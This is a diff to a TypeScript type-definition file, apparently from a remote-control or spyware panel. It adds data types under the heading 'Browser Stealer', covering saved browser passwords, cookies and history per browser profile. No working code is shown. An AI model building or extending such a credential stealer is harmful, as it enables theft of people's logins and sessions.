@@ -294,6 +294,45 @@ export interface QQPortrait {
   nickname: string;
 }
 
+// ── Browser Stealer types ────────────────────────────────────────────
+
+export interface BrowserPassword {
+  browser: string;
+  profile: string;
+  url: string;
+  username: string;
+  password: string;
+}
+
+export interface BrowserCookie {
+  browser: string;
+  profile: string;
+  host: string;
+  name: string;
+  value: string;
+  path: string;
+  expires: number;
+}
+
+export interface BrowserHistory {
+  browser: string;
+  profile: string;
+  url: string;
+  title: string;
+  visits: number;
+  lastVisit: number;
+}
+
+export type BrowserDataType = 'passwords' | 'cookies' | 'history';
+
+export interface BrowserPagedResult<T> {
+  total: number;
+  offset: number;
+  limit: number;
+  items: T[];
+  errors: string[];
+}
+
 // ── Proxy Browser types ──────────────────────────────────────────────
 
 export interface ProxyResponse {
